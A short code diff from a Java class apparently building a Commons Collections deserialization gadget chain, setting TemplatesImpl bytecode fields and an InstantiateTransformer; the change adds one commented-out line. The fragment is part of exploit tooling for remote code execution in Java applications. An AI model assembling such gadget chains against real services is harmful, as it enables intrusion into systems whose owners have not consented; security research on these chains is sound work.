@@ -39,6 +39,7 @@ public class CommonsCollectionsK1_1 {
         setFieldValue(obj,"_bytecodes",new byte[][] {code});
         setFieldValue(obj,"_name","");
         setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
+//        setFieldValue(obj,"namesArray", new String[]{"1"});
         InstantiateTransformer i=new InstantiateTransformer
                 (
                         new Class[] { Templates.class },
